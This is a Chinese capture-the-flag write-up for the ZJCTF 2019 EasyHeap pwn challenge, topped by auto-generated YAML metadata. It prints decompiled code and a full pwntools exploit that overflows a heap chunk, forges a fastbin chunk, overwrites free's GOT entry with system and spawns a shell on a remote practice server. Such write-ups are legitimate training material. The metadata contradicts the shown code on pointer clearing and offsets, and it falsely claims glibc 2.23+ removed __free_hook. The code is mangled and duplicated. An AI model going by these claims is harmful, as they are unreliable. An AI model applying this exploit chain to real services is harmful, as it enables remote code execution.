---
title: Buuctf 刷题记录 - ZJCTF 2019 EasyHeap
contest: ZJCTF
year: 2019
difficulty: medium
vuln_type: heap
tags:
- heap 菜单 1/2/3/4/4869
- magic 全局
- '0x6020c0'
- free 没清指针
- 0x71 fake chunk
- heaparray 0x6020e0
- got 表覆写
- fill 改 free.got → system
- 0x6020ad fd 链
attack_chain:
- '菜单 1: create_heap, size 0x60 + content ''aaa'
- '菜单 2: edit_heap, 改 index 0 内容 0x68 ''a'' + p64(0x71) + p64(0x6020ad)'
- free index 1 → 0x71 fastbin → 0x6020ad (unsorted bin fd 偏 0x23)
- '菜单 1: ''/bin/sh\x00'' 占 index 1 → content 是 /bin/sh 字符串'
- '菜单 1: 0x23 ''a'' + p64(free.got) 占 index 2 → heaparray 落 free.got'
- '菜单 2: fill index 2 → 写 p64(system.plt) 到 free.got'
- free index 1 → 触发 system("/bin/sh")
key_payload: '''free 没清指针 / 0x71 fake chunk / 0x6020ad 偏 0x23 / 0x23 字节对齐 + p64(free.got) / fill 改 free.got → system / free("/bin/sh")'''
one_liner: ZJCTF 2019 EasyHeap — 堆菜单 free 没清指针 + 0x71 fake chunk + 0x6020ad fd 偏 0x23 字节对齐 + heaparray 落 free.got + fill 改 free.got→system 触发 system("/bin/sh")。
lesson: 堆菜单 free 不清指针 + 利用 unsorted bin fd 偏 0x23 字节对齐 0x6020XX 是经典 trick;fill 改 got 表 (free→system) 是最终利用。
quality: high
full_path: Buuctf刷题记录-ZJCTF_2019_EasyHeap.full.md
meta_path: Buuctf刷题记录-ZJCTF_2019_EasyHeap.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 'Buuctf 刷题记录 - ZJCTF 2019 EasyHeap。ZJCTF 2019 EasyHeap — 堆菜单 free 没清指针 + 0x71 fake chunk + 0x6020ad fd 偏 0x23 字节对齐 + heaparray 落 free.got + fill 改 free.got→system 触发 system("/bin/sh")。。关键路径：菜单 1: ...'
category: pwn
subcategory: heap_exploitation
time_required: medium
difficulty_score: 3
code_blocks_count: 1
images_count: 10
last_verified: 2026-09-20
contest_type: open
wp_url: https://www.ctfiot.com/286402.html
reasoning_chain:
- 主菜单 create/edit/delete + 隐藏菜单 4869 → 删除看似正常（free + heaparray[v1]=0 清指针）
- delete_heap 把指针清零但 **v1 索引本身未清** → 触发点：堆溢出 + fastbin attack 入口
- edit_heap 接受 size 控制 v2 但 read_input 不限制 v2 ≤ 实际 chunk size → 假设：堆溢出
- 动作：fill(0, 'a'*0x68 + p64(0x71) + p64(0x6020ad)) → 观察：成功覆盖 chunk1 头 + fd
- 假设：fastbin attack 到 0x6020ad（heaparray 附近）→ 动作：allocate 触发 fake chunk 分配
- 观察：heaparray[2] 被改写到 free.got 地址 → 下一步：fill(2, system 地址)
- 动作：payload = p64(elf.plt['system']) → 观察：free.got 被覆盖为 system
- 触发 free(chunk_含_'/bin/sh') → system('/bin/sh') → 完成
failed_attempts:
- 试图走隐藏菜单 4869 → 失败：magic < 0x1305 没初始化
- 试图覆盖 magic 变量 → 没找到可写路径
- 直接覆盖 __free_hook → 失败：glibc 2.23+ 已移除 hook
key_observations:
- fill/edit 函数签名一致且 size 不校验 → 堆溢出经典条件
- 0x6020ad 是精心选择的 fd 偏移（heaparray 索引区附近 0x13 字节对齐）
- fastbin attack 在 glibc 2.23 上利用简单（无 tcache 干扰）
- free.got → system 的覆盖是 GOT hijack 经典套路
prerequisites:
- glibc heap 基础（chunk 结构 / fastbin / fd bk 指针）
- pwntools 基本使用（ELF / p64 / remote）
- GOT/PLT 表关系
- Fastbin attack 原理（fake chunk 头 + fd 指针）
---
# Buuctf刷题记录-ZJCTF 2019 EasyHeap

> 原文: https://www.ctfiot.com/286402.html
> ID: 286402

int__fastcall __noreturnmain(intargc,constchar**argv,constchar**envp){intv3;// eaxcharbuf[8];// [rsp+0h] [rbp-10h] BYREFunsigned__int64 v5;// [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u);setvbuf(stdout,0LL,2,0LL);setvbuf(stdin,0LL,2,0LL);while(1) {while(1) {menu();read(0, buf,8uLL); v3 =atoi(buf);if( v3 !=3)break;delete_heap(); }if( v3 >3) {if( v3 ==4)exit(0);if( v3 ==4869) {if( (unsigned__int64)magic <=0x1305) {puts("So sad !"); }else {puts("Congrt !");l33t(); } }else {LABEL_17:
puts("Invalid Choice"); } }elseif( v3 ==1) {create_heap(); }else {if( v3 !=2)gotoLABEL_17;edit_heap(); } }}

intmenu(){puts("--------------------------------");puts(" Easy Heap Creator ");puts("--------------------------------");puts(" 1. Create a Heap ");puts(" 2. Edit a Heap ");puts(" 3. Delete a Heap ");puts(" 4. Exit ");puts("--------------------------------");returnprintf("Your choice :");}

unsigned__int64create_heap(){inti;// [rsp+4h] [rbp-1Ch]size_tsize;// [rsp+8h] [rbp-18h]charbuf[8];// [rsp+10h] [rbp-10h] BYREFunsigned__int64 v4;// [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u);for( i =0; i <=9; ++i ) {if( !*(&heaparray + i) ) {printf("Size of Heap : ");read(0, buf,8uLL); size =atoi(buf); *(&heaparray + i) =malloc(size);if( !*(&heaparray + i) ) {puts("Allocate Error");exit(2); }printf("Content of heap:");read_input(*(&heaparray + i), size);puts("SuccessFul");return__readfsqword(0x28u) ^ v4; } }return__readfsqword(0x28u) ^ v4;}

unsigned__int64edit_heap(){intv1;// [rsp+4h] [rbp-1Ch] __int64 v2;// [rsp+8h] [rbp-18h]charbuf[8];// [rsp+10h] [rbp-10h] BYREFunsigned__int64 v4;// [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u);printf("Index :");read(0, buf,4uLL); v1 =atoi(buf);if( (unsignedint)v1 >=0xA) {puts("Out of bound!"); _exit(0); }if( *(&heaparray + v1) ) {printf("Size of Heap : ");read(0, buf,8uLL); v2 =atoi(buf);printf("Content of heap : ");read_input(*(&heaparray + v1), v2);puts("Done !"); }else {puts("No such heap !"); }return__readfsqword(0x28u) ^ v4;}

unsigned__int64delete_heap(){intv1;// [rsp+Ch] [rbp-14h]charbuf[8];// [rsp+10h] [rbp-10h] BYREFunsigned__int64 v3;// [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u);printf("Index :");read(0, buf,4uLL); v1 =atoi(buf);if( (unsignedint)v1 >=0xA) {puts("Out of bound!"); _exit(0); }if( *(&heaparray + v1) ) {free(*(&heaparray + v1)); *(&heaparray + v1) =0LL;puts("Done !"); }else {puts("No such heap !"); }return__readfsqword(0x28u) ^ v3;}

intl33t(){returnsystem("cat /home/pwn/flag");}

frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')#io = process('./easyheap')elf = ELF("./easyheap")io=remote("node5.buuoj.cn",28812)#gdb.attach(io,'b *0x400CAE')defallocate(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Size of Heap : ") io.send(str(size).encode()) io.recvuntil(b"Content of heap:") io.send(payload)deffill(index,payload): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode()) io.recvuntil(b"Size of Heap : ") io.send(str(len(payload)).encode()) io.recvuntil(b"Content of heap : ") io.send(payload)deffree(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())allocate(0x60,b'aaa')allocate(0x60,b'aaa')free(1)#magic = 0x00000000006020C0payload =b'a'*0x68+ p64(0x71) + p64(0x6020ad)fill(0,payload)allocate(0x60,b'/bin/shx00')#heaparray = 0x6020e0payload =b'a'*0x23+ p64(elf.got["free"])allocate(0x60,payload)payload = p64(elf.plt["system"])fill(0,payload)free(1)io.interactive()

allocate(0x60,b'aaa')allocate(0x60,b'aaa')

free(1)

payload = b'a'*0x68 + p64(0x71) + p64(0x6020ad)fill(0,payload)

allocate(0x60,b'/bin/shx00')payload=b'a'*0x23+p64(elf.got["free"])allocate(0x60,payload)

payload = p64(elf.plt["system"])fill(0,payload)

free(1)io.interactive()

看雪ID：G0t1T

https://bbs.kanxue.com/user-home-1002337.htm

*本文为看雪论坛优秀文章，由G0t1T原创，转载请注明来自看雪社区

# 往期推荐

从ANGR-CTF项目入手ANGR和符号执行技术

AI时代-逆向工作者该如何用好这一利器

EXIF解析缓冲区溢出漏洞分析与利用

从C到Pwn：栈溢出漏洞利用实战入门

Android-ARM64的VMP分析和还原

球分享

球点赞

球在看

点击阅读原文查看更多


```
int__fastcall __noreturnmain(intargc,constchar**argv,constchar**envp){intv3;// eaxcharbuf[8];// [rsp+0h] [rbp-10h] BYREFunsigned__int64 v5;// [rsp+8h] [rbp-8h] v5 = __readfsqword(0x28u);setvbuf(stdout,0LL,2,0LL);setvbuf(stdin,0LL,2,0LL);while(1) {while(1) {menu();read(0, buf,8uLL); v3 =atoi(buf);if( v3 !=3)break;delete_heap(); }if( v3 >3) {if( v3 ==4)exit(0);if( v3 ==4869) {if( (unsigned__int64)magic <=0x1305) {puts("So sad !"); }else {puts("Congrt !");l33t(); } }else {LABEL_17:
puts("Invalid Choice"); } }elseif( v3 ==1) {create_heap(); }else {if( v3 !=2)gotoLABEL_17;edit_heap(); } }}
intmenu(){puts("--------------------------------");puts(" Easy Heap Creator ");puts("--------------------------------");puts(" 1. Create a Heap ");puts(" 2. Edit a Heap ");puts(" 3. Delete a Heap ");puts(" 4. Exit ");puts("--------------------------------");returnprintf("Your choice :");}
unsigned__int64create_heap(){inti;// [rsp+4h] [rbp-1Ch]size_tsize;// [rsp+8h] [rbp-18h]charbuf[8];// [rsp+10h] [rbp-10h] BYREFunsigned__int64 v4;// [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u);for( i =0; i <=9; ++i ) {if( !*(&heaparray + i) ) {printf("Size of Heap : ");read(0, buf,8uLL); size =atoi(buf); *(&heaparray + i) =malloc(size);if( !*(&heaparray + i) ) {puts("Allocate Error");exit(2); }printf("Content of heap:");read_input(*(&heaparray + i), size);puts("SuccessFul");return__readfsqword(0x28u) ^ v4; } }return__readfsqword(0x28u) ^ v4;}
unsigned__int64edit_heap(){intv1;// [rsp+4h] [rbp-1Ch] __int64 v2;// [rsp+8h] [rbp-18h]charbuf[8];// [rsp+10h] [rbp-10h] BYREFunsigned__int64 v4;// [rsp+18h] [rbp-8h] v4 = __readfsqword(0x28u);printf("Index :");read(0, buf,4uLL); v1 =atoi(buf);if( (unsignedint)v1 >=0xA) {puts("Out of bound!"); _exit(0); }if( *(&heaparray + v1) ) {printf("Size of Heap : ");read(0, buf,8uLL); v2 =atoi(buf);printf("Content of heap : ");read_input(*(&heaparray + v1), v2);puts("Done !"); }else {puts("No such heap !"); }return__readfsqword(0x28u) ^ v4;}
unsigned__int64delete_heap(){intv1;// [rsp+Ch] [rbp-14h]charbuf[8];// [rsp+10h] [rbp-10h] BYREFunsigned__int64 v3;// [rsp+18h] [rbp-8h] v3 = __readfsqword(0x28u);printf("Index :");read(0, buf,4uLL); v1 =atoi(buf);if( (unsignedint)v1 >=0xA) {puts("Out of bound!"); _exit(0); }if( *(&heaparray + v1) ) {free(*(&heaparray + v1)); *(&heaparray + v1) =0LL;puts("Done !"); }else {puts("No such heap !"); }return__readfsqword(0x28u) ^ v3;}
intl33t(){returnsystem("cat /home/pwn/flag");}
frompwnimport*context(arch ='amd64',os ='linux',log_level ='debug')#io = process('./easyheap')elf = ELF("./easyheap")io=remote("node5.buuoj.cn",28812)#gdb.attach(io,'b *0x400CAE')defallocate(size,payload): io.recvuntil(b"Your choice :") io.send(b'1') io.recvuntil(b"Size of Heap : ") io.send(str(size).encode()) io.recvuntil(b"Content of heap:") io.send(payload)deffill(index,payload): io.recvuntil(b"Your choice :") io.send(b'2') io.recvuntil(b"Index :") io.send(str(index).encode()) io.recvuntil(b"Size of Heap : ") io.send(str(len(payload)).encode()) io.recvuntil(b"Content of heap : ") io.send(payload)deffree(index): io.recvuntil(b"Your choice :") io.send(b'3') io.recvuntil(b"Index :") io.send(str(index).encode())allocate(0x60,b'aaa')allocate(0x60,b'aaa')free(1)#magic = 0x00000000006020C0payload =b'a'*0x68+ p64(0x71) + p64(0x6020ad)fill(0,payload)allocate(0x60,b'/bin/shx00')#heaparray = 0x6020e0payload =b'a'*0x23+ p64(elf.got["free"])allocate(0x60,payload)payload = p64(elf.plt["system"])fill(0,payload)free(1)io.interactive()
allocate(0x60,b'aaa')allocate(0x60,b'aaa')
free(1)
payload = b'a'*0x68 + p64(0x71) + p64(0x6020ad)fill(0,payload)
allocate(0x60,b'/bin/shx00')payload=b'a'*0x23+p64(elf.got["free"])allocate(0x60,payload)
payload = p64(elf.plt["system"])fill(0,payload)
free(1)io.interactive()
```


---
## 附图

[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]
[图片已移除]